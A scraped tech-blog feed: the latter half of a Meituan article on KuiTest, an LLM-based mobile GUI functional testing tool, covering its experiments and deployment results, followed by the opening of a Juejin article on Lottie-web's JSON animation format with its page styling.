<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/893f1ebb82ba44cc92e3946fff4a59eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=sZbkdS1rh8bXB9%2FQnSPECE%2FQLxE%3D" alt="图 4 - 交互响应结果验证过程与 Prompt" loading="lazy"/></p>
<p>交互后响应验证是 KuiTest 判断 UI 功能是否存在 Bug 的核心环节，流程分为状态比对和 LLM 决策两步：KuiTest 在模拟用户交互后，先通过像素对比判断交互前后 UI 是否有视觉变化，若无变化则直接标记为 “UI 交互无响应”；若有变化，则让多模态模型判断实际 UI 响应是否符合前述预测。至此，KuiTest 完成了从 UI 功能语义测试到通用推理能力任务的转换，既规避了传统基于规则测试繁杂的开发和维护成本，也提升了大模型在 UI 测试领域的决策的可靠性，降低误报率。</p>
<h2 data-id="heading-5">3. 实验测试</h2>
<p>KuiTest 的实验设计以验证其对解决工业级 UI 功能的测试能力为核心，在美团实际场景中筛选真实数据构造数据集，并且设计针对性基线对比方案。在验证技术有效性的同时为业务落地提供数据支撑，下文将继续介绍实验设计、设置以及结果分析。</p>
<h3 data-id="heading-6">3.1 实验设计</h3>
<p>实验围绕三个关键问题（RQ）进行，目标是验证 KuiTest 设计的有效性与合理性，以及是否满足工业落地要求。针对 LLM 在 UI 理解领域能力不足的问题，设置 RQ1 从误报率和成本的角度验证任务分解（拆分为 “组件功能识别 + 交互后响应验证”）的综合性能。此外，设置 RQ2 评估多模态输入 + 图标库的方案是否能提高 LLM 的组件识别能力。最后，针对工业场景对 “高召回、低误报” 的刚需，设置 RQ3 验证 KuiTest 在美团 App 中的落地能力，重点评估决定缺陷覆盖度的召回率以及直接影响人工排查成本的误报率。</p>
<h3 data-id="heading-7">3.2 实验数据与对照方法</h3>
<p>实验使用的基准数据集自美团的核心业务线（外卖、酒店、旅行等），这些业务线的 UI 风格、交互规则均有差异，因此具备对真实的工业测试场景的代表性。具体而言，RQ1 数据集含 150 个 UI 交互操作（25 个历史 Bug+125 个正常用例），bug 比例 16.7%，对应新功能测试场景；RQ2 数据集涵盖 250 个可交互 UI 组件（含文本与无文本类型），确保组件多样性；RQ3 数据集含 100 个真实 UI 页面（4664 个组件、150 个注入 Bug），Bug 占比仅 3.2%，与工业场景 Bug 稀疏的实际情况一致。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e57259126daa416abcb245f2f380c067~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=hkDBWPR1HRCMvlVbaIsNAOW0Clw%3D" alt="图 5 - 任务分解的示意与基线方法" loading="lazy"/></p>
<p>我们为各实验设置了基线方法作为对照：RQ1 设无分解（直接让大模型判断）与三步分解（单独提取交互后页面语义）对照，前者验证是否需要分解，后者验证分解步数合理性；RQ2 设纯 LLM（仅截图）、图片 + 文本（无图标库）、SoM + 文本（无图标库）对照，分别验证文本信息、组件标记以及图标库的价值，排除单一变量干扰；RQ3 虽无外部工具对照，但通过覆盖美团内 10 种业务线，以验证 KuiTest 的现实泛化性。</p>
<h3 data-id="heading-8">3.3 实验结果</h3>
<p><strong>RQ1：任务分解的合理性</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/991ac6b758d446f6b37d8bd87d442235~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cI8W2%2B0nUDajhCJ2YB1hG83Q12I%3D" alt="" loading="lazy"/></p>
<p>任务分解对比结果显示，有分解的方案比无分解的方案在准确率和召回率上都有明显提高，并且 KuiTest 的两步分解方案（组件识别 + 响应验证）表现最优：平均准确率 86%、召回率 85%。</p>
<p>这一结果印证了任务分解合理性。对于三步分解的方案效果会略差于两步分解的结果，我们分析发现三步分解额外语义提取步骤，虽能提升页面类型理解，但会让 LLM 忽略图标颜色变化等细节，导致非跳转类 UI 功能 Bug 漏检（如点击收藏按钮后按钮应该从空心变为实心），且增加计算成本。这说明分解并非步骤越多越好，需贴合大模型能力边界，找到可靠性和效率平衡点，而两步分解恰好成为实现这一目标的最优解。</p>
<p><strong>RQ2：组件功能识别的有效性</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e53ef8fa69e43f3a9a6cd8b4064c8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cqNjZfZCpLYw1DfFSrHaO6lCRs4%3D" alt="" loading="lazy"/></p>
<p>组件功能识别结果显示，KuiTest 方案的平均识别准确率达 95.5%，其中文本组件准确率 96%，无文本图标准确率 95%；而对照方案中，纯 LLM 的无文本图标准确率仅 13%，图片 + 文本和 SoM + 文本的方案准确率也未突破 20%。</p>
<p>这一数据表明对 UI 图像进行标记以及对 UI 组件语义信息的额外补充，能够显著提高 LLM 的 UI 组件功能识别能力。LLM 视觉理解能力薄弱，纯截图输入无法识别无文本图标，而 OCR 文本 + 组件标记能补充组件的文本语义，提升文本组件识别准确率。借助图标库为无文本组件补充功能描述，直接将其识别准确率从 13% 提升至 95%。并且这一图标库并不是全量的，说明仅通过业务线常用图标即可覆盖大部分场景，兼顾准确性与成本。</p>
<p><strong>RQ3：对于真实 UI 功能异常识别的有效性</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92d84a1449774e02875f78d910554e84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cg1ig5BjvFCHlNGTf2ESFtspezg%3D" alt="" loading="lazy"/></p>
<p>在美团 10 大业务线的真实场景测试中，KuiTest 整体召回率 86%、精确率 71%、误报率 1.2%，且各业务线表现稳定。这些实验结果表明 KuiTest 具备实际落地能力。86% 的召回率意味着能覆盖绝大多数真实 UI 功能 bug，避免漏检关键缺陷。1.2% 的误报率有效避免导致测试工程师进行无效排查，大幅降低人工成本。71% 的精确率虽看似不高，但因实验中 Bug 占比仅 3.2%（与真实场景一致），在 Bug 稀疏环境下已属优秀。实验结果证明了 KuiTest 在真实测试场景中能平衡覆盖度与准确性。</p>
<h2 data-id="heading-9">4. 应用效果</h2>
<p>目前，KuiTest 已在美团的多类业务场景中落地应用，过去 6 个月有 20 个业务方向使用，总执行 <strong>21 万+Cases、8000 多个 Jobs，近期周均触发 5000 多个 Cases</strong>；在多个实测项目如鸿蒙适配、神会员地理传参巡检、酒店商家多语言适配等，KuiTest 发现了百余例有效的 UI 功能缺陷。</p>
<h3 data-id="heading-10">4.1 HarmonyOS NEXT 平台遍历</h3>
<p>传统的 GUI 测试脚本的设计依赖于 App 的 UI 逻辑，但是不同操作系统上同一 App 的有所差异，这种差异会导致在一个系统上设计的脚本在另一个系统上失效，因此使得跨平台的测试十分困难，需要测试人员手动调整甚至重新设计测试脚本，适配成本较大。</p>
<p>美团 App 在 Android/iOS 平台的测试脚本较为完善，但是在 HarmonyOS NEXT 平台的测试脚本仍在完善之中，大量页面仍处于未测试状态。因此，KuiTest 被率先部署于该平台的稳定性巡检中，根据指定业务起始页面，自动地进行跨页面遍历，识别并验证崩溃、报错、功能不符合预期的情况，以减少重新设计测试脚本的成本。</p>
<p>项目中覆盖首批适配的 3 项业务，<strong>项目交付周期总体累计运行 1230 小时、共 4 万+个自动化测试用例，发现 34 个有效异常</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87dea501422c4a02bc20c36f0f2e8510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=OvPGhe6vDibmsRjgZRr2qPRJdy0%3D" alt="图 6 - 发现的缺陷举例" loading="lazy"/></p>
<h3 data-id="heading-11">4.2 大前端回归巡检</h3>
<p>由于美团 App 的更新速度十分快速，因此每周都需要进行回归巡检。传统的测试脚本的方法由于人力消耗过大，往往只能覆盖 App 中的核心业务区域，但是其他区域的 Bug 实际也会影响用户体验。而 KuiTest 能够测试一张页面的所有可交互组件，以一种低成本的方式提高测试覆盖率。因此，我们将 KuiTest 运用在美团的大前端回归巡检当中：截至目前，KuiTest 已经超一年稳定运行，累计检测出了 140+有效异常。</p>
<h2 data-id="heading-12">5. 认知与展望</h2>
<p>KuiTest 作为无规则的移动应用 GUI 功能测试工具，标志着软件测试领域向智能化、自动化方向迈出的探索一步。该工具通过合理的任务拆解与多模态 UI 组件功能识别将大模型通识作为测试预言，利用其广泛的知识模拟用户期望，成功突破了传统基于规则测试方法的局限性，切实提升了 LLM 在 GUI 测试场景中的可靠性和实用性。</p>
<p>当前 KuiTest 主要聚焦于单步交互的功能验证，这是出于对测试可靠性和效率的权衡考虑。然而，向多步交互场景扩展是一个自然且必要的发展趋势，真实用户场景中存在大量需要多步操作才能触发的复杂功能 bug，例如，在执行操作序列“查看订单列表 → 点击 "待付款" 订单 → 选择退款 → 确认退款原因”时发现点击“待付款”后，页面却显示“退款订单”。</p>
<p>未来研究应当探索如何将测试能力扩展到长链路交互场景。针对长链路 Bug 分析，需要建立状态追踪机制来记录每一步交互后的 UI 状态变化，通过对比预期状态与实际状态的差异来识别异常节点，同时利用 LLM 的推理能力建立操作步骤之间的因果关系链，当检测到功能异常时能够回溯定位是哪一步操作导致了错误，这种因果推断能力对于复杂交互序列中的 Bug 定位至关重要。同时，可以引入基于历史 Bug 数据的学习机制, 分析过往发现的长链路 Bug 模式，自动生成类似的高风险测试路径，优先探索容易出现问题的操作序列组合。这种智能化的路径生成不仅能提高测试效率，还能显著提升对复杂功能 Bug 的检测能力。</p>
<h2 data-id="heading-13">6. 合作方简介</h2>
<p>复旦大学周扬帆教授团队致力于新型软件系统的性能优化与故障排查研究，近年团队在软件系统领域的重要会议如 OSDI、SOSP、ICSE、FSE 等发表了多篇高影响力论文。最近，该团队以解决 UI 自动化测试中的复杂问题为核心，将大模型应用于 UI 功能认知与 UI 交互规划，以一系列创新方法显著提高了解决方案的适应性和稳定性。团队注重科研成果的实际应用，积极与企业及相关机构合作，共建实用工具和系统，推动研究成果的落地，助力合作伙伴提升技术能力并实现业务价值。</p>
<p><strong>注释</strong></p>
<ul>
<li>[1] vision-ui 模型：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMeituan-Dianping%2Fvision-ui" target="_blank" title="https://github.com/Meituan-Dianping/vision-ui" ref="nofollow noopener noreferrer">美团视觉 UI 分析工具</a></li>
<li>[2] SoM（Set-of-Mark）策略：Yang J, Zhang H, Li F, et al. Set-of-mark prompting unleashes extraordinary visual grounding in gpt-4v [J]. arXiv preprint arXiv: 2310.11441, 2023.</li>
<li>[3] CLIP（Contrastive Language–Image Pre-training）模型：Radford A, Kim J W, Hallacy C, et al. Learning transferable visual models from natural language supervision [C]//International conference on machine learning. PMLR, 2021: 8748-8763.</li>
</ul>
<p>| 关注「美团技术团队」微信公众号，在公众号菜单栏对话框回复【2024年货】、【2023年货】、【2022年货】、【2021年货】、【2020年货】、【2019年货】、【2018年货】、【2017年货】等关键词，可查看美团技术团队历年技术文章合集。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89308933a541498590ec1ac5230750a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=eKt7FWWIhOdMvg6ix8MxDfaV59E%3D" alt="" loading="lazy"/></p>
<p>| 本文系美团技术团队出品，著作权归属美团。欢迎出于分享和交流等非商业目的转载或使用本文内容，敬请注明“内容转载自美团技术团队”。本文未经许可，不得进行商业性转载或者使用。任何商用行为，请发送邮件至 <a href="https://link.juejin.cn?target=mailto%3Atech%40meituan.com" target="_blank" title="mailto:tech@meituan.com" ref="nofollow noopener noreferrer">tech@meituan.com</a> 申请授权。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒]]></title>    <link>https://juejin.cn/post/7594389937463033866</link>    <guid>https://juejin.cn/post/7594389937463033866</guid>    <pubDate>2026-01-13T02:34:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937463033866" data-draft-id="7583980250734116927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-13T02:34:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哨卫哥"/> <meta itemprop="url" content="https://juejin.cn/user/2159893031168119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2159893031168119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哨卫哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:34:12.000Z" title="Tue Jan 13 2026 02:34:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读41分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>Lottie 的本质是 <strong>After Effects 动画的 Web 播放器</strong>，其工作流程清晰简洁：</p>
<ol>
<li><strong>设计</strong> → 设计师在 <strong>After Effects（AE）</strong> 中制作矢量动画</li>
<li><strong>导出</strong> → 通过 Bodymovin 插件将动画导出为轻量的 <code>data.json</code> 文件</li>
<li><strong>播放</strong> → web 开发者使用 <code>lottie-web</code> 库解析该 JSON，并在浏览器中实时渲染动画</li>
</ol>
